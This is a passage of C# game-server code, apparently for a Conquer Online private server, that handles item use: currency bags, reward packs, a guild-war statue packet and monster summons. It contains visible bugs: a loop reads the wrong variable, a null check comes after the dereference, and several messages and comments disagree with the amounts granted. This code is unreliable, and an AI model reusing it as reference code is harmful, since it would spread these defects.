                        client.Entity.ConquerPoints += 25;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 720663: // 50 cps
                    {
                        client.Entity.ConquerPoints += 50;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }

                case 720659: // 50 cps
                    {
                        client.Entity.ConquerPoints += 50;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 720660: // 100 cps
                    {
                        client.Entity.ConquerPoints += 100;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 720664: // 100 cps
                    {
                        client.Entity.ConquerPoints += 100;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 720665: // 1000000000 cps  Created By jiMMy
                    {
                        if (client.Entity.ConquerPoints <= 1000000050)
                        {
                            client.Entity.ConquerPoints += 1000000000;
                        }
                        else
                        {
                            client.MessageBox(" You Shouldn't Have More Than 1 Mlyar To Open It ");
                            return;
                        }
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 720675: // 250 cps
                    {
                        client.Entity.ConquerPoints += 250;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 720653: // 270 cps
                    {
                        client.Entity.ConquerPoints += 270;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 720681: // 500 cps
                    {
                        client.Entity.ConquerPoints += 500;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 720676: // 500 cps
                    {
                        client.Entity.ConquerPoints += 500;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 3001136: // 500 cps
                    {
                        client.Entity.ConquerPoints += 500;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                #endregion
                #region medium Bag Cps
                case 720677: // 1000 cps
                    {
                        client.Entity.ConquerPoints += 1000;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 720682: // 1000 cps
                    {
                        client.Entity.ConquerPoints += 1000;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 720687: // 1000 cps
                    {
                        client.Entity.ConquerPoints += 1000;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 720661: // 1350 cps
                    {
                        client.Entity.ConquerPoints += 1350;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 720654: // 1380 cps
                    {
                        client.Entity.ConquerPoints += 1380;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 720683: // 2000 cps
                    {
                        client.Entity.ConquerPoints += 2000;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 720688: // 2000 cps
                    {
                        client.Entity.ConquerPoints += 2000;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 720693: // 2500 cps
                    {
                        client.Entity.ConquerPoints += 2500;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 720666: // 2700 cps
                    {
                        client.Entity.ConquerPoints += 2700;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 720689: // 4000 cps
                    {
                        client.Entity.ConquerPoints += 4000;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 720694: // 5000 cps
                    {
                        client.Entity.ConquerPoints += 5000;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 720662: // 6900 cps
                    {
                        client.Entity.ConquerPoints += 6900;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                #endregion
                #region high bag Cps
                case 720695: // 10000 cps
                    {
                        client.Entity.ConquerPoints += 10000;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 720678: // 13500 cps
                    {
                        client.Entity.ConquerPoints += 13500;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 720667: // 13800 cps
                    {
                        client.Entity.ConquerPoints += 13800;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }

                #endregion
                #endregion
                #region Chi point
                case 3000051: // 5 Point
                    {
                        client.ChiPoints += 5;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 729476: // 100 Point
                    {
                        client.ChiPoints += 100;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 729477: // 200 Point
                    {
                        client.ChiPoints += 200;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 729478: // 300 Point
                    {
                        client.ChiPoints += 300;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 729479: // 400 Point
                    {
                        client.ChiPoints += 400;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                #endregion
                #region DiligenceBook
                case 723340:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.SubClasses.StudyPoints += 5;
                        client.Send(new MTA.Network.GamePackets.SubClassShow(0) { ID = 8, Study = client.Entity.SubClasses.StudyPoints, StudyReceive = 5 }.ToArray());
                        MTA.Network.GamePackets._String str = new MTA.Network.GamePackets._String(true)
                        {
                            Type = 10,
                            UID = client.Entity.UID
                        };
                        str.Texts.Add("zf2-e300");
                        client.SendScreen(str.ToArray(), true);
                        client.Inventory.Add(723903, 0, 10);
                        client.Send(new Message("Congratulations you got 5 study Points keep going", System.Drawing.Color.Red, Message.TopLeft));
                    }
                    break;
                #endregion
                #region ModestyBook
                case 723342:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.SubClasses.StudyPoints += 500;
                        client.Send(new MTA.Network.GamePackets.SubClassShow(0) { ID = 8, Study = client.Entity.SubClasses.StudyPoints, StudyReceive = 500 }.ToArray());
                        MTA.Network.GamePackets._String str = new MTA.Network.GamePackets._String(true)
                        {
                            Type = 10,
                            UID = client.Entity.UID
                        };
                        str.Texts.Add("zf2-e300");
                        client.SendScreen(str.ToArray(), true);
                        client.Send(new Message("Congratulations you got 500 study Points keep going", System.Drawing.Color.Red, Message.TopLeft));
                    }
                    break;
                #endregion
                case 723341:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.SubClasses.StudyPoints += 20;
                        client.Send(new MTA.Network.GamePackets.SubClassShow(0) { ID = 8, Study = client.Entity.SubClasses.StudyPoints, StudyReceive = 20 }.ToArray());
                        MTA.Network.GamePackets._String str = new MTA.Network.GamePackets._String(true)
                        {
                            Type = 10,
                            UID = client.Entity.UID
                        };
                        str.Texts.Add("zf2-e300");
                        client.SendScreen(str.ToArray(), true);
                        client.Send(new Message("Congratulations you got 50 study Points keep going", System.Drawing.Color.Red, Message.TopLeft));
                    }
                    break;
                case 1088000:
                    {
                        client.Entity.ConquerPoints += Database.ConquerItemInformation.BaseInformations[1088000].ConquerPointsWorth;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                #region GuildWar Statue
                case 720020:
                    {
                        if (client.AsMember.Rank == Game.Enums.GuildMemberRank.GuildLeader)
                        {
                            if (client.Guild.PoleKeeper && client.Guild != null && client.AsMember.Rank == Game.Enums.GuildMemberRank.GuildLeader && !Game.GuildWar.IsWar)
                            {
                                #region Work
                                byte[] test = new byte[((ushort)(247 + client.Entity.Name.Length + 8))];
                                Writer.WriteUshort((ushort)(test.Length - 8), 0, test);
                                Writer.WriteUshort(10014, 2, test);
                                Writer.WriteUint((uint)(client.Entity.TransformationID * 10000000 + client.Entity.Face * 10000 + client.Entity.Body), 8, test);//body
                                Writer.WriteUint(105175, 12, test); //UID   
                                Writer.WriteUshort(client.Entity.GuildID, 16, test);//guild ID
                                Writer.WriteUshort(client.Entity.GuildRank, 20, test);//guild Rank
                                Writer.WriteUint(100, 27, test);
                                #region Equip same as me
                                foreach (ConquerItem item3 in client.Equipment.Objects)
                                {
                                    if (item == null)
                                        continue;
                                    switch ((ushort)item.Position)
                                    {
                                        case ConquerItem.Head:
                                            {
                                                if (item.Purification.Available)
                                                {
                                                    Network.Writer.WriteUInt32(0, 194 + 4, test);
                                                }
                                                Writer.WriteUInt32(item.ID, 44 + 4, test);// Offset Correto.
                                                Writer.WriteUInt16((byte)item.Color, 139 + 4, test);// Offset Correto.
                                                break;
                                            }
                                        case ConquerItem.Garment:
                                            {
                                                Writer.WriteUInt32(item.ID, 48 + 4, test);// Offset Correto.
                                                break;
                                            }
                                        case ConquerItem.Armor:
                                            {
                                                if (item.Purification.Available)
                                                {
                                                    Writer.WriteUInt32(item.Purification.PurificationItemID, 200 + 4, test);// Offset Correto.
                                                }
                                                Writer.WriteUInt32(item.ID, 52 + 4, test);// Offset Correto.          
                                                Writer.WriteUInt16((byte)item.Color, 137 + 4, test);// Offset Correto.
                                                break;
                                            }
                                        case ConquerItem.RightWeapon:
                                            {
                                                if (item.Purification.Available)
                                                {
                                                    Writer.WriteUInt32(item.Purification.PurificationItemID, 208 + 4, test);// Offset Correto.
                                                }
                                                Writer.WriteUInt32(item.ID, 60 + 4, test);// Offset Correto.  
                                                break;
                                            }
                                        case ConquerItem.LeftWeapon:
                                            {
                                                if (item.Purification.Available)
                                                {
                                                    Writer.WriteUInt32(item.Purification.PurificationItemID, 204 + 4, test);// Offset Correto.
                                                }
                                                Writer.WriteUInt32(item.ID, 56 + 4, test);// Offset Correto.
                                                Writer.WriteUInt16((byte)item.Color, 137 + 4, test);// Offset Correto.\                                                    
                                                break;
                                            }
                                        case ConquerItem.RightWeaponAccessory:
                                            {
                                                Writer.WriteUInt32(item.ID, 68 + 4, test);
                                                break;
                                            }
                                        case ConquerItem.LeftWeaponAccessory:
                                            {
                                                Writer.WriteUInt32(item.ID, 64 + 4, test);
                                                break;
                                            }
                                        case ConquerItem.Steed:
                                            {
                                                Writer.WriteUInt32(item.ID, 72 + 4, test);
                                                Writer.WriteUInt16((byte)item.Plus, 147 + 4, test);
                                                Writer.WriteUInt32(item.SocketProgress, 153 + 4, test);
                                                break;
                                            }
                                        case ConquerItem.SteedArmor:
                                            {
                                                Writer.WriteUInt32(item.ID, 76 + 4, test);
                                                break;
                                            }
                                    }
                                }
                                #endregion Equip same as me
                                //     var value = Update.Flags.Ride;
                                // Writer.WriteUInt64(value, 0x16 + 4, test);
                                Writer.WriteUshort((ushort)client.Entity.Hitpoints, 89, test);//npc hitpoints
                                Writer.WriteUshort(client.Entity.Level, 96, test);//level 
                                Writer.WriteUshort(client.Entity.X, 98, test);
                                Writer.WriteUshort(client.Entity.Y, 100, test);
                                Writer.WriteUshort(client.Entity.HairStyle, 102, test);//npc hitpoints  
                                Writer.WriteByte(7, 104, test);//fascing
                                Writer.WriteByte((byte)client.Entity.Action, 105, test);//action
                                //    Writer.WriteByte(byte.Parse(Data[1]), byte.Parse(Data[2]), test);
                                Writer.WriteByte(1, 244, test);
                                Writer.WriteByte((byte)client.Entity.Name.Length, 245, test);
                                Writer.WriteString(client.Entity.Name, 246, test);
                                client.Send(test);
                                #endregion
                            }
                            else
                            {
                                client.Send(new Message("You can't use this item unless you win the war!", System.Drawing.Color.Tan, Message.TopLeft));
                            }
                        }
                        else
                        {
                            client.Send(new Message("You can't use this item unless you're a guild leader!", System.Drawing.Color.Tan, Message.TopLeft));
                        }
                        break;
                    }
                #endregion

                #region ArenaEXPPack
                case 723912:
                    {
                        client.Entity.ConquerPoints += 1;
                        client.Entity.killerpoints += 1;
                        client.Send(new Message("Congratulations! " + client.Entity.Name + " You get " + 1 + " ConquerPoints From Arena Pack and Get 1 Vip Point's .", System.Drawing.Color.Red, Message.Whisper));
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Delete);
                        break;
                    }
                #endregion
                #region ChampionPack
                case 3001046: // 30kk cps
                    {
                        client.Entity.ConquerPoints += 500;
                        client.Entity.killerpoints += 200;
                        client.Send(new Message("Congratulations! " + client.Entity.Name + " You get 500 ConquerPoints From Arena Pack and Get 100 Vip Point's.", System.Drawing.Color.Red, Message.Whisper));
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                #endregion
                #region GuildWar Bomb
                /*case 721261:
                    {
                        if (Game.GuildWar.IsWar)
                        {
                            if (client.Entity.MapID == 1038 & client.Entity.X == 165 & client.Entity.Y == 213)
                            {
                                MTA.Game.GuildWar.LeftGate.Mesh = (ushort)(250 + MTA.Game.GuildWar.LeftGate.Mesh % 10);
                                Update upd = new Update(true);
                                upd.UID = MTA.Game.GuildWar.LeftGate.UID;
                                upd.Append(Update.Mesh, MTA.Game.GuildWar.LeftGate.Mesh);
                                client.SendScreen(upd, true);
                                client.SendScreen(upd, true);
                                _String str = new _String(true);
                                str.UID = client.Entity.UID;
                                str.TextsCount = 1;
                                str.Type = _String.Effect;
                                str.Texts.Add("bombFranko");
                                client.Entity.SendScreen(str);
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                                break;
                            }
                            else
                            {
                                if (client.Entity.MapID == 1038 & client.Entity.X == 225 & client.Entity.Y == 178)
                                {
                                    MTA.Game.GuildWar.RightGate.Mesh = (ushort)(280 + MTA.Game.GuildWar.RightGate.Mesh % 10);
                                    Update upd = new Update(true);
                                    upd.UID = MTA.Game.GuildWar.RightGate.UID;
                                    upd.Append(Update.Mesh, MTA.Game.GuildWar.RightGate.Mesh);
                                    client.SendScreen(upd, true);
                                    _String str = new _String(true);
                                    str.UID = client.Entity.UID;
                                    str.TextsCount = 1;
                                    str.Type = _String.Effect;
                                    str.Texts.Add("bombFranko");
                                    client.Entity.SendScreen(str);
                                    client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                                    break;
                                }
                                else
                                {
                                    client.Send(new Message("You Can't Open Here Sorry Open in GuildWar (165,213) OR (225,178)", System.Drawing.Color.Red, Message.TopLeft));
                                }
                                //{
                                //    client.Send(new Message("Sorry Guild War Not Running", System.Drawing.Color.Red, Message.TopLeft));
                                //}
                            }
                        }
                        break;
                    }*/
                #endregion
                #region Cps Bag Event
                case 720159:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Delete);
                        client.Entity.ConquerPoints += 10;
                        _String str4 = new _String(true);
                        str4.UID = client.Entity.UID;
                        str4.TextsCount = 1;
                        str4.Type = _String.Effect;
                        str4.Texts.Add("accession6");
                        client.SendScreen(str4, true);

                        client.Send(new MTA.Network.GamePackets.Message("Congulrations! You Have just Found 10 Cps Keep Going To Be A Molioner", System.Drawing.Color.Tan, MTA.Network.GamePackets.Message.TopLeft)); // Random Message 
                        break;
                    }
                #endregion
                #region OutstandingExploitPack
                case 3007108:
                    {
                        client.Entity.lacb += 50;
                        client.Send(new Message("Congratulations You receive 50 War Exploits , 50 pts to Union Fund", System.Drawing.Color.Red, Message.World));
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        break;
                    }
                #endregion
                #region ExcellentExploitPack
                case 3007109:
                    {
                        client.Entity.lacb += 100;
                        client.Send(new Message("Congratulations You receive 50 Champion Points , 100 War Exploits , 160 pts to Union Fund", System.Drawing.Color.Red, Message.World));
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        break;
                    }
                #endregion
                #region SupremeExploitPack
                case 3007110:
                    {
                        client.Entity.lacb += 150;
                        client.Send(new Message("Congratulations You receive 100 Champion Points , 150 War Exploits , 360 pts to Union Fund", System.Drawing.Color.Red, Message.World));
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        break;
                    }
                #endregion  
                #region MemoryAgate
                case 0xaffbc:
                    if (Constants.revnomap.Contains(client.Entity.MapID) || Constants.MemoryAgateNotAllowedMap.Contains(client.Entity.MapID))
                    {
                        client.Send(new MTA.Network.GamePackets.Message("You Can't record here !", System.Drawing.Color.Tan, 0x7dc));
                        return;
                    }
                    item.SendAgate(client);
                    break;
                #endregion MemoryAgate
                #region booth item
                case 3001523:
                    {
                        #region booth
                        {
                            if (client.Booth == null)
                            {
                                client.Send(new MapStatus() { BaseID = client.Map.BaseID, ID = client.Map.ID, Status = Database.MapsTable.MapInformations[1036].Status });
                                client.Booth = new Game.ConquerStructures.Booth(client, new Data(true) { UID = client.Entity.UID });
                                client.Send(new Data(true) { ID = GamePackets.Data.ChangeAction, UID = client.Entity.UID, dwParam = 0 });
                                //client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            }
                            break;
                        }
                        #endregion booth
                    }
                #endregion booth
                #region PowerEXPBall
                case 723744:
                case 722057:
                    {
                        if (client.Entity.Level < 140)
                        {
                            client.IncreaseExperience(((Database.DataHolder.LevelExperience(client.Entity.Level) / 100) * 20), false);
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        }
                        else
                            client.Send(new Message("You Already level 140, you do not need the EXP", System.Drawing.Color.Red, Message.TopLeft));
                        break;
                    }
                #endregion
                #region Elite PK Prizez
                #region Lvl 130+
                case 720729: //champion lvl 130+
                    {
                        if (client.Inventory.Count > 40 - 23)
                        {
                            client.Send("You need atleast 23 open spots!");
                            break;
                        }
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Inventory.Add(720049, 0, 1);
                        client.Inventory.Add(720730, 0, 3, true);
                        client.Inventory.Add(720731, 0, 5);
                        client.Inventory.Add(729626, 0, 5);
                        client.Inventory.Add(1088000, 0, 3);
                        client.Inventory.Add(720598, 0, 3);
                        client.Inventory.Add(723342, 0, 3);
                        break;
                    }
                case 720728: //#2 lvl 130+
                    {
                        if (client.Inventory.Count > 40 - 23)
                        {
                            client.Send("You need atleast 23 open spots!");
                            break;
                        }
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Inventory.Add(720730, 0, 1, true);
                        client.Inventory.Add(720731, 0, 3);
                        client.Inventory.Add(729626, 0, 3);
                        client.Inventory.Add(1088000, 0, 1);
                        client.Inventory.Add(720598, 0, 2);
                        client.Inventory.Add(723342, 0, 1);
                        break;
                    }
                case 720727: //#3 lvl 130+
                    {
                        if (client.Inventory.Count > 40 - 23)
                        {
                            client.Send("You need atleast 23 open spots!");
                            break;
                        }
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Inventory.Add(723700, 0, 5, true);
                        client.Inventory.Add(720731, 0, 2);
                        client.Inventory.Add(729626, 0, 2);
                        client.Inventory.Add(720598, 0, 1);
                        client.Inventory.Add(723342, 0, 1);
                        break;
                    }
                case 720726: //#4-8 lvl 130+
                    {
                        if (client.Inventory.Count > 40 - 23)
                        {
                            client.Send("You need atleast 23 open spots!");
                            break;
                        }
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Inventory.Add(723700, 0, 3, true);
                        client.Inventory.Add(720731, 0, 1);
                        client.Inventory.Add(729626, 0, 1);
                        client.Inventory.Add(720598, 0, 1);
                        client.Inventory.Add(723341, 0, 1);
                        break;
                    }
                #endregion
                #region Lvl 120+
                case 720725: //champion lvl 120+
                    {
                        if (client.Inventory.Count > 40 - 23)
                        {
                            client.Send("You need atleast 23 open spots!");
                            break;
                        }
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.IncreaseExperience(Database.DataHolder.LevelExperience(client.Entity.Level), false);
                        client.Inventory.Add(1088000, 0, 1);
                        client.Inventory.Add(723341, 0, 5);
                        client.Inventory.Add(729626, 0, 1);
                        client.Inventory.Add(720731, 0, 3);
                        break;
                    }
                case 720724: //#2 lvl 130+
                    {
                        if (client.Inventory.Count > 40 - 23)
                        {
                            client.Send("You need atleast 23 open spots!");
                            break;
                        }
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.IncreaseExperience(Database.DataHolder.LevelExperience(client.Entity.Level) / 2, false);
                        client.Inventory.Add(723341, 0, 3);
                        client.Inventory.Add(729626, 0, 1);
                        client.Inventory.Add(720731, 0, 2);
                        break;
                    }
                case 720723: //#3 lvl 130+
                    {
                        if (client.Inventory.Count > 40 - 23)
                        {
                            client.Send("You need atleast 23 open spots!");
                            break;
                        }
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.IncreaseExperience(Database.DataHolder.LevelExperience(client.Entity.Level) / 10 * 3, false);
                        client.Inventory.Add(723341, 0, 2);
                        client.Inventory.Add(729626, 0, 1);
                        client.Inventory.Add(720731, 0, 1);
                        break;
                    }
                case 720722: //#4-8 lvl 130+
                    {
                        if (client.Inventory.Count > 40 - 23)
                        {
                            client.Send("You need atleast 23 open spots!");
                            break;
                        }
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.IncreaseExperience(Database.DataHolder.LevelExperience(client.Entity.Level) / 100 * 15, false);
                        client.Inventory.Add(723341, 0, 1);
                        client.Inventory.Add(729626, 0, 1);
                        break;
                    }
                #endregion
                #region Lvl 110+
                case 720721: //champion lvl 120+
                    {
                        if (client.Inventory.Count > 40 - 23)
                        {
                            client.Send("You need atleast 23 open spots!");
                            break;
                        }
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.IncreaseExperience(Database.DataHolder.LevelExperience(client.Entity.Level), false);
                        client.Inventory.Add(1088000, 0, 1);
                        client.Inventory.Add(723341, 0, 5);
                        client.Inventory.Add(729626, 0, 1);
                        client.Inventory.Add(720731, 0, 3);
                        break;
                    }
                case 720720: //#2 lvl 130+
                    {
                        if (client.Inventory.Count > 40 - 23)
                        {
                            client.Send("You need atleast 23 open spots!");
                            break;
                        }
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.IncreaseExperience(Database.DataHolder.LevelExperience(client.Entity.Level) / 2, false);
                        client.Inventory.Add(723341, 0, 3);
                        client.Inventory.Add(729626, 0, 1);
                        client.Inventory.Add(720731, 0, 2);
                        break;
                    }
                case 720719: //#3 lvl 130+
                    {
                        if (client.Inventory.Count > 40 - 23)
                        {
                            client.Send("You need atleast 23 open spots!");
                            break;
                        }
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.IncreaseExperience(Database.DataHolder.LevelExperience(client.Entity.Level) / 10 * 3, false);
                        client.Inventory.Add(723341, 0, 2);
                        client.Inventory.Add(729626, 0, 1);
                        client.Inventory.Add(720731, 0, 1);
                        break;
                    }
                case 720718: //#4-8 lvl 130+
                    {
                        if (client.Inventory.Count > 40 - 23)
                        {
                            client.Send("You need atleast 23 open spots!");
                            break;
                        }
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.IncreaseExperience(Database.DataHolder.LevelExperience(client.Entity.Level) / 100 * 15, false);
                        client.Inventory.Add(723341, 0, 1);
                        client.Inventory.Add(729626, 0, 1);
                        break;
                    }
                #endregion
                #region Lvl 1+
                case 720717: //champion lvl 120+
                    {
                        if (client.Inventory.Count > 40 - 23)
                        {
                            client.Send("You need atleast 23 open spots!");
                            break;
                        }
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.IncreaseExperience(Database.DataHolder.LevelExperience(client.Entity.Level), false);
                        client.Inventory.Add(1088000, 0, 1);
                        client.Inventory.Add(723341, 0, 5);
                        client.Inventory.Add(729626, 0, 1);
                        client.Inventory.Add(720731, 0, 3);
                        break;
                    }
                case 720716: //#2 lvl 130+
                    {
                        if (client.Inventory.Count > 40 - 23)
                        {
                            client.Send("You need atleast 23 open spots!");
                            break;
                        }
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.IncreaseExperience(Database.DataHolder.LevelExperience(client.Entity.Level) / 2, false);
                        client.Inventory.Add(723341, 0, 3);
                        client.Inventory.Add(729626, 0, 1);
                        client.Inventory.Add(720731, 0, 2);
                        break;
                    }
                case 720715: //#3 lvl 130+
                    {
                        if (client.Inventory.Count > 40 - 23)
                        {
                            client.Send("You need atleast 23 open spots!");
                            break;
                        }
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.IncreaseExperience(Database.DataHolder.LevelExperience(client.Entity.Level) / 10 * 3, false);
                        client.Inventory.Add(723341, 0, 2);
                        client.Inventory.Add(729626, 0, 1);
                        client.Inventory.Add(720731, 0, 1);
                        break;
                    }
                case 720714: //#4-8 lvl 130+
                    {
                        if (client.Inventory.Count > 40 - 23)
                        {
                            client.Send("You need atleast 23 open spots!");
                            break;
                        }
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.IncreaseExperience(Database.DataHolder.LevelExperience(client.Entity.Level) / 100 * 15, false);
                        client.Inventory.Add(723341, 0, 1);
                        client.Inventory.Add(729626, 0, 1);
                        break;
                    }
                #endregion
                case 729626:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        var array = Database.ConquerItemInformation.BaseInformations.Values
                            .Where(p => (p.ID >= 724130 && p.ID <= 724499 && p.Name.Contains("Super"))).ToArray();
                        client.Inventory.Add(array[Kernel.Random.Next(array.Length)].ID, 0, 1);
                        // 
                        break;
                    }
                case 720731:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        var array = Database.ConquerItemInformation.BaseInformations.Keys
                            .Where(p => (p >= 350001 && p <= 380030)).ToArray();
                        client.Inventory.Add(array[Kernel.Random.Next(array.Length)], 0, 1);
                        break;
                    }
                case 720049: // random steed pack
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        ConquerItem _item = new ConquerItem(true);
                        _item.ID = 300000;
                        Database.ConquerItemInformation _iteminfos = new Database.ConquerItemInformation(_item.ID, 0);
                        _item.Durability = _item.MaximDurability = _iteminfos.BaseInformation.Durability;
                        _item.Plus = 6;
                        _item.Effect = Game.Enums.ItemEffect.Horse;
                        if (Kernel.Random.Sign() == 1)
                            _item.SocketProgress = 150 << 8 | 255 << 16;
                        else if (Kernel.Random.Sign() == 1)
                            _item.SocketProgress = 150 | 255 << 8;
                        else
                            _item.SocketProgress = 255 | 150 << 16;
                        client.Inventory.Add(_item, Game.Enums.ItemUse.CreateAndAdd);
                        break;
                    }
                #endregion
                #region DemonBox
                #region SuperMonster
                case 3001661:
                    {
                        if (DateTime.Now >= client.matrixtime.AddMinutes(5.0))
                        {
                            client.matrixtime = DateTime.Now;
                            client.Entity.Update(_String.Effect, "fathitgtsyd", true);
                            Database.MonsterInformation monster = new MTA.Database.MonsterInformation();
                            monster.Hitpoints = 7500000;
                            monster.Level = 200;
                            monster.Mesh = 984;
                            monster.Name = "SuperMonster";
                            monster.MaxAttack = 80000;
                            monster.AttackRange = 10;
                            monster.AttackType = 2;
                            monster.SpellID = 10304;
                            monster.AttackSpeed = 1500;
                            monster.ViewRange = 10;
                            monster.MoveSpeed = 500;
                            monster.RunSpeed = 500;
                            monster.MinAttack = 70000;
                            Game.Entity entity = new Game.Entity(Game.EntityFlag.Monster, false);
                            entity.MapObjType = Game.MapObjectType.Monster;
                            entity.MonsterInfo = monster;
                            entity.MonsterInfo.Owner = entity;
                            entity.Name = "SuperMonster";
                            entity.MinAttack = monster.MinAttack;
                            entity.MaxAttack = entity.MagicAttack = monster.MaxAttack;
                            entity.Hitpoints = entity.MaxHitpoints = monster.Hitpoints;
                            entity.Body = monster.Mesh;
                            entity.Level = monster.Level;
                            entity.Defence = 20000;
                            entity.X = (ushort)(client.Entity.X - 2);
                            entity.Y = (ushort)(client.Entity.Y - 2);
                            entity.EntityFlag = MTA.Game.EntityFlag.Monster;
                            entity.MapID = client.Entity.MapID;
                            entity.SendUpdates = true;
                            client.Map.RemoveEntity(entity);
                            Network.GamePackets._String stringPacket = new MTA.Network.GamePackets._String(true);
                            stringPacket.UID = monster.ID;
                            stringPacket.Type = Network.GamePackets._String.Effect;
                            stringPacket.Texts.Add("MBStandard");
                            client.Map.AddEntity(entity);

                            client.Inventory.Remove(item, Enums.ItemUse.Remove);
                            break;
                        }
                        else
                        {
                            TimeSpan Remain = client.matrixtime.AddMinutes(5.0) - DateTime.Now;
                            string message = "Time Till Next Usage :";
                            message += string.Format("{1} Minutes : {2} Seconds", Remain.Hours, Remain.Minutes, Remain.Seconds);
                            client.MessageBox(message, null, null);
                            break;
                        }
                    }


                #endregion
                #region MonkeyMonster
                case 3001660:
                    {
                        if (DateTime.Now >= client.matrixtime.AddMinutes(5.0))
                        {
                            client.matrixtime = DateTime.Now;
                            client.Entity.Update(_String.Effect, "fathitgtsyd", true);
                            Database.MonsterInformation monster = new MTA.Database.MonsterInformation();
                            monster.Hitpoints = 7500000;
                            monster.Level = 200;
                            monster.Mesh = 981;
                            monster.Name = "MonkeyMonster";
                            monster.MaxAttack = 70000;
                            monster.AttackRange = 10;
                            monster.AttackType = 2;
                            monster.SpellID = 10304;
                            monster.AttackSpeed = 1500;
                            monster.ViewRange = 10;
                            monster.MoveSpeed = 500;
                            monster.RunSpeed = 500;
                            monster.MinAttack = 60000;

                            Game.Entity entity = new Game.Entity(Game.EntityFlag.Monster, false);
                            entity.MapObjType = Game.MapObjectType.Monster;
                            entity.MonsterInfo = monster;
                            entity.MonsterInfo.Owner = entity;
                            entity.Name = "MonkeyMonster";
                            entity.MinAttack = monster.MinAttack;
